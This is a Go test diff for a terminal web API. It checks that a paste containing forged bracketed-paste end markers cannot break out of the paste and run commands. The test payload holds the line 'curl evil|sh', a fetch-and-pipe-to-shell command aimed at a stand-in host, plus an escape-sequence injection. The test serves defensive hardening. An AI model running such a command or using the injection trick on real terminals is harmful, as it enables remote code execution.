@@ -180,6 +180,56 @@ func TestTerminalPasteRefusesOverflowOrAChangedBindingWithoutSending(t *testing.
 	}
 }
 
+func TestTerminalPasteCannotEndItselfEarly(t *testing.T) {
+	paste := "\x1b[200~\x1b[20\x1b[201~1~\rcurl evil|sh\r\x1b[200~日本🙂\r\n\x1b\x1b[201~"
+	inside := "[201~\rcurl evil|sh\r日本🙂\r\n"
+	for _, isControl := range []bool{false, true} {
+		t.Run(fmt.Sprint(isControl), func(t *testing.T) {
+			native := newTestTerminal()
+			_, server, identity, runner := terminalHTTPFixture(t, native)
+			native.frames <- fullFrame(1)
+			body := `{}`
+			if isControl {
+				body = `{"cols":80,"rows":24,"control":true,"identity":"` + identity + `"}`
+			}
+			response := terminalPost(t, server, "/api/terminal/stream", body)
+			defer response.Body.Close()
+			scanner := bufio.NewScanner(response.Body)
+			var ready struct {
+				Lease string `json:"lease"`
+			}
+			if !scanner.Scan() || json.Unmarshal(scanner.Bytes(), &ready) != nil || ready.Lease == "" {
+				t.Fatalf("no view lease: %s", scanner.Text())
+			}
+			command, _ := json.Marshal(herdr.TerminalCommand{Type: "terminal.input", Text: paste})
+			reply := terminalPost(t, server, "/api/terminal/input", fmt.Sprintf(`{"lease":%q,"seq":1,"command":%s}`, ready.Lease, command))
+			defer reply.Body.Close()
+			if reply.StatusCode != 200 {
+				t.Fatalf("paste = %d, want 200", reply.StatusCode)
+			}
+			var got, want []string
+			if isControl {
+				for _, write := range native.writes {
+					if write.Type == "terminal.input" {
+						got = append(got, write.Text)
+					}
+				}
+				want = []string{"\x1b[200~" + inside + "\x1b[201~"}
+			} else {
+				for _, request := range runner.socket.Requests() {
+					if text, ok := request.Params["text"].(string); ok && request.Method == "pane.send_input" && request.Params["pane_id"] == "w1:p1" {
+						got = append(got, text)
+					}
+				}
+				want = []string{inside}
+			}
+			if !reflect.DeepEqual(got, want) {
+				t.Fatalf("forwarded %q, want %q", got, want)
+			}
+		})
+	}
+}
+
 func terminalHTTPFixture(t *testing.T, native *testTerminal) (*HTTP, *httptest.Server, string, *cfoRunner) {
 	t.Helper()
 	store, _ := testStore(t)
